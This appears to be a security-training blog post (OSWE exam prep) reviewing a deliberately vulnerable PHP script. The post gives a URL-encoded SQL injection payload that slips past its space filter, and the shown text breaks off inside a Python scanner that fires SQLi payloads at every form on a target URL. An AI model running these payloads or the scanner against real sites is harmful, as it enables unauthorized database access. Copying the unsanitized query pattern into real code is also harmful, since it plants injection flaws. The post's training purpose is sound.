@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Raind33rs blog</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this template -->
+  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <!-- Custom styles for this template -->
+  <link href="css/clean-blog.min.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://twitter.com/raind33r_dc">Raind33r</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">About</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="post.html">Start</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="contact.html">Contact</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('img/post-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>AWAE - OSWE prep excercise three</h1>
+            <h2 class="subheading">Problems look mighty small</h2>
+            <span class="meta">Posted by
+              <a href="#">a sudden reindeer</a>
+              on August 24, 2019</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h2 class="section-heading">Simple php code example</h2>
+
+          <p>For the simple code review excercise, read the code and try to develop the exact payload without any black box approach:</p>
+          <blockquote class="blockquote">Please take the time to understand</blockquote>
+	  <pre style='color:#000000;background:#ffffff;'><span style='color:#5f5035; background:#ffffe8; '>&lt;?php</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#797997; background:#ffffe8; '>$conn</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>new</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#bb7977; background:#ffffe8; font-weight:bold; '>mysqli</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$servername</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$username</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$password</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$dbname</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#696969; background:#ffffe8; '>// Check connection</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$conn</span><span style='color:#808030; background:#ffffe8; '>-></span><span style='color:#797997; background:#ffffe8; '>connect_error</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>die</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#0000e6; background:#ffffe8; '>"Connection failed: "</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$conn</span><span style='color:#808030; background:#ffffe8; '>-></span><span style='color:#797997; background:#ffffe8; '>connect_error</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#797997; background:#ffffe8; '>$str</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$_GET</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'username'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$str</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#400000; background:#ffffe8; '>trim</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$str</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>&amp;</span><span style='color:#808030; background:#ffffe8; '>&amp;</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#400000; background:#ffffe8; '>strpos</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$str</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0000e6; background:#ffffe8; '>' '</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>!</span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0f4d75; background:#ffffe8; '>false</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>echo</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0000e6; background:#ffffe8; '>'Hello HACKER!'</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#808030; background:#ffffe8; '>!</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>empty</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$_SERVER</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'HTTP_CLIENT_IP'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;	</span><span style='color:#797997; background:#ffffe8; '>$ip</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$_SERVER</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'HTTP_CLIENT_IP'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>elseif</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#808030; background:#ffffe8; '>!</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>empty</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$_SERVER</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'HTTP_X_FORWARDED_FOR'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;	</span><span style='color:#797997; background:#ffffe8; '>$ip</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$_SERVER</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'HTTP_X_FORWARDED_FOR'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>else</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;	</span><span style='color:#797997; background:#ffffe8; '>$ip</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$_SERVER</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'REMOTE_ADDR'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>echo</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0000e6; background:#ffffe8; '>"&lt;/br>YOUR IP: "</span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#797997; background:#ffffe8; '>$ip</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '> </span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>exit</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#797997; background:#ffffe8; '>$sql</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0000e6; background:#ffffe8; '>"SELECT * FROM secret WHERE username='"</span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#797997; background:#ffffe8; '>$_GET</span><span style='color:#808030; background:#ffffe8; '>[</span><span style='color:#0000e6; background:#ffffe8; '>'username'</span><span style='color:#808030; background:#ffffe8; '>]</span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#0000e6; background:#ffffe8; '>"'"</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#797997; background:#ffffe8; '>$result</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$conn</span><span style='color:#808030; background:#ffffe8; '>-</span><span style='color:#808030; background:#ffffe8; '>></span><span style='color:#400000; background:#ffffe8; '>query</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$sql</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$result</span><span style='color:#808030; background:#ffffe8; '>-></span><span style='color:#797997; background:#ffffe8; '>num_rows</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>></span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#008c00; background:#ffffe8; '>0</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#696969; background:#ffffe8; '>// output data of each row</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>while</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$row</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#797997; background:#ffffe8; '>$result</span><span style='color:#808030; background:#ffffe8; '>-</span><span style='color:#808030; background:#ffffe8; '>></span><span style='color:#400000; background:#ffffe8; '>fetch_assoc</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>	</span><span style='color:#400000; background:#ffffe8; '>print_r</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$row</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>else</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#000000; background:#ffffe8; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>echo</span><span style='color:#000000; background:#ffffe8; '> </span><span style='color:#0000e6; background:#ffffe8; '>"0 results"</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#797997; background:#ffffe8; '>$conn</span><span style='color:#808030; background:#ffffe8; '>-</span><span style='color:#808030; background:#ffffe8; '>></span><span style='color:#400000; background:#ffffe8; '>close</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span>
+<span style='color:#5f5035; background:#ffffe8; '>?></span>
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 14:08:35 UTC -->
+          <p>It may be interesting to mention that sqlmap did not find this one :). If you want to test it, just copy the request from burpsuite into a file and use the -r parameter of sqlmap:</p>
+	  <a href="img/sc1.png">
+            <img class="img-fluid" src="img/sc1.png" alt="">
+          </a>
+          <h2 class="section-heading">Bypass weak filter</h2>
+	  <p>It looks like the script is not allowing any spaces. Also it seems that some ip address blocking fun is present. If this was a black box approach it may seem on the first sight that there is some good security present because there are no errors, while it is actually really simple to bypass these weak black list protections: </p>
+<pre style='color:#55cc66;background:#001800;'>GET /tmp.php?username=%27%09%6f%72%09%31%3d%31%3b%09%2d%2d%09%2d
+</pre>
+<!--Created using ToHtml.com on 2019-11-24 14:19:58 UTC -->
+<p>There are probably multiple ways to bypass this, but this seemed as the easiest, check it out!</p>
+<h2 class="section-heading">Automation</h2>
+<p>Lets now assume that your task is to find SQLi vulnerabilities on a really massive website among all GET and POST request parameters. This excercise will be useful later when you will be required to write simple proof of concept code. So the next excercise is: write a simple python scanner for SQLi vulns among POST and GET requests for a given url. </p>
+<blockquote class="blockquote">Please take the your time to try the excercises</blockquote>
+<h2 class="section-heading">Solution</h2>
+<pre style='color:#55cc66;background:#001800;'><span style='color:#b96969; '>#!/usr/bin/python3</span>
+
+<span style='color:#508050; font-weight:bold; '>import</span> requests
+<span style='color:#508050; font-weight:bold; '>import</span> optparse
+<span style='color:#508050; font-weight:bold; '>from</span> ast <span style='color:#508050; font-weight:bold; '>import</span> literal_eval
+<span style='color:#508050; font-weight:bold; '>from</span> pprint <span style='color:#508050; font-weight:bold; '>import</span> pprint
+<span style='color:#508050; font-weight:bold; '>from</span> bs4 <span style='color:#508050; font-weight:bold; '>import</span> BeautifulSoup <span style='color:#508050; font-weight:bold; '>as</span> bs
+<span style='color:#508050; font-weight:bold; '>from</span> urllib<span style='color:#808030; '>.</span>parse <span style='color:#508050; font-weight:bold; '>import</span> urljoin
+
+<span style='color:#508050; font-weight:bold; '>def</span> sqli<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span>cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    forms <span style='color:#808030; '>=</span> get_forms<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>with</span> <span style='color:#400000; '>open</span><span style='color:#808030; '>(</span><span style='color:#cc5555; '>'SQLi.txt'</span><span style='color:#808030; '>)</span> <span style='color:#508050; font-weight:bold; '>as</span> payloads<span style='color:#808030; '>:</span>
+        <span style='color:#508050; font-weight:bold; '>for</span> payload <span style='color:#508050; font-weight:bold; '>in</span> payloads<span style='color:#808030; '>:</span>
+            <span style='color:#508050; font-weight:bold; '>for</span> form <span style='color:#508050; font-weight:bold; '>in</span> forms<span style='color:#808030; '>:</span>
+                form_details <span style='color:#808030; '>=</span> retrieve_form<span style='color:#808030; '>(</span>form<span style='color:#808030; '>)</span>
+                res <span style='color:#808030; '>=</span> submit_form<span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>,</span> url<span style='color:#808030; '>,</span> payload<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>)</span>
+                <span style='color:#b96969; '>#print (content.elapsed.total_seconds())</span>
+                <span style='color:#508050; font-weight:bold; '>if</span> res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span> <span style='color:#44aadd; '>></span> <span style='color:#778c77; '>3</span><span style='color:#808030; '>:</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span> <span style='color:#808030; '>(</span>res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>f<span style='color:#cc5555; '>"[+] Possible SQL Injection detected {url}"</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>f<span style='color:#cc5555; '>"[+]: Submitted form"</span><span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>print</span><span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>)</span>
+                    <span style='color:#508050; font-weight:bold; '>return</span> <span style='color:#477766; '>True</span>
+        <span style='color:#508050; font-weight:bold; '>return</span> <span style='color:#477766; '>False</span>
+
+<span style='color:#508050; font-weight:bold; '>def</span> get_forms<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    soup <span style='color:#808030; '>=</span> bs<span style='color:#808030; '>(</span>requests<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span>url<span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>content<span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"html.parser"</span><span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>return</span> soup<span style='color:#808030; '>.</span>find_all<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"form"</span><span style='color:#808030; '>)</span>
+
+<span style='color:#508050; font-weight:bold; '>def</span> submit_form<span style='color:#808030; '>(</span>form_details<span style='color:#808030; '>,</span> url<span style='color:#808030; '>,</span> value<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    target_url <span style='color:#808030; '>=</span> urljoin<span style='color:#808030; '>(</span>url<span style='color:#808030; '>,</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span>
+    inputs <span style='color:#808030; '>=</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"inputs"</span><span style='color:#808030; '>]</span>
+    data <span style='color:#808030; '>=</span> <span style='color:#800080; '>{</span><span style='color:#800080; '>}</span>
+    res <span style='color:#808030; '>=</span> <span style='color:#808030; '>[</span><span style='color:#cc5555; '>""</span><span style='color:#808030; '>,</span><span style='color:#cc5555; '>""</span><span style='color:#808030; '>]</span>
+    <span style='color:#b96969; '>#cookies = dict(cook='val', password='guessme')</span>
+    <span style='color:#508050; font-weight:bold; '>for</span> <span style='color:#400000; '>input</span> <span style='color:#508050; font-weight:bold; '>in</span> inputs<span style='color:#808030; '>:</span>
+        <span style='color:#400000; '>input</span><span style='color:#808030; '>[</span><span style='color:#cc5555; '>"value"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> value
+        input_name <span style='color:#808030; '>=</span> <span style='color:#400000; '>input</span><span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>)</span>
+        input_value <span style='color:#808030; '>=</span> <span style='color:#400000; '>input</span><span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"value"</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>if</span> input_name <span style='color:#508050; font-weight:bold; '>and</span> input_value<span style='color:#808030; '>:</span>
+            data<span style='color:#808030; '>[</span>input_name<span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> input_value
+    <span style='color:#508050; font-weight:bold; '>if</span> form_details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>]</span> <span style='color:#44aadd; '>==</span> <span style='color:#cc5555; '>"post"</span><span style='color:#808030; '>:</span>
+        response <span style='color:#808030; '>=</span> requests<span style='color:#808030; '>.</span>post<span style='color:#808030; '>(</span>target_url<span style='color:#808030; '>,</span> data<span style='color:#808030; '>=</span>data<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>=</span>cookies<span style='color:#808030; '>)</span>
+        <span style='color:#b96969; '>#print (response.elapsed.total_seconds())</span>
+        res<span style='color:#808030; '>[</span><span style='color:#778c77; '>0</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response
+        res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response<span style='color:#808030; '>.</span>elapsed<span style='color:#808030; '>.</span>total_seconds<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+        <span style='color:#508050; font-weight:bold; '>return</span> res
+    response <span style='color:#808030; '>=</span> requests<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span>target_url<span style='color:#808030; '>,</span> params<span style='color:#808030; '>=</span>data<span style='color:#808030; '>,</span> cookies<span style='color:#808030; '>=</span>cookies<span style='color:#808030; '>)</span>
+    <span style='color:#b96969; '>#print (response.elapsed.total_seconds())</span>
+    res<span style='color:#808030; '>[</span><span style='color:#778c77; '>0</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response
+    res<span style='color:#808030; '>[</span><span style='color:#778c77; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>=</span>response<span style='color:#808030; '>.</span>elapsed<span style='color:#808030; '>.</span>total_seconds<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    <span style='color:#508050; font-weight:bold; '>return</span> res
+
+<span style='color:#508050; font-weight:bold; '>def</span> retrieve_form<span style='color:#808030; '>(</span>form<span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+    details <span style='color:#808030; '>=</span> <span style='color:#800080; '>{</span><span style='color:#800080; '>}</span>
+    action <span style='color:#808030; '>=</span> form<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>lower<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    method <span style='color:#808030; '>=</span> form<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"get"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>.</span>lower<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span>
+    inputs <span style='color:#808030; '>=</span> <span style='color:#808030; '>[</span><span style='color:#808030; '>]</span>
+    <span style='color:#508050; font-weight:bold; '>for</span> input_tag <span style='color:#508050; font-weight:bold; '>in</span> form<span style='color:#808030; '>.</span>find_all<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"input"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>:</span>
+        input_type <span style='color:#808030; '>=</span> input_tag<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"type"</span><span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"text"</span><span style='color:#808030; '>)</span>
+        input_name <span style='color:#808030; '>=</span> input_tag<span style='color:#808030; '>.</span>attrs<span style='color:#808030; '>.</span>get<span style='color:#808030; '>(</span><span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>)</span>
+        inputs<span style='color:#808030; '>.</span>append<span style='color:#808030; '>(</span><span style='color:#800080; '>{</span><span style='color:#cc5555; '>"type"</span><span style='color:#808030; '>:</span> input_type<span style='color:#808030; '>,</span> <span style='color:#cc5555; '>"name"</span><span style='color:#808030; '>:</span> input_name<span style='color:#800080; '>}</span><span style='color:#808030; '>)</span>
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"action"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> action
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"method"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> method
+    details<span style='color:#808030; '>[</span><span style='color:#cc5555; '>"inputs"</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> inputs
+    <span style='color:#508050; font-weight:bold; '>return</span> details
+
+
+<span style='color:#508050; font-weight:bold; '>if</span> <span style='color:#477766; '>__name__</span> <span style='color:#44aadd; '>==</span> <span style='color:#cc5555; '>"__main__"</span><span style='color:#808030; '>:</span>
+    parser <span style='color:#808030; '>=</span> optparse<span style='color:#808030; '>.</span>OptionParser<span style='color:#808030; '>(</span><span style='color:#cc5555; '>'usage %prog '</span><span style='color:#44aadd; '>+</span>\
+      <span style='color:#cc5555; '>'-u &lt;target url page> -c &lt;cookie>'</span><span style='color:#44aadd; '>+</span>\
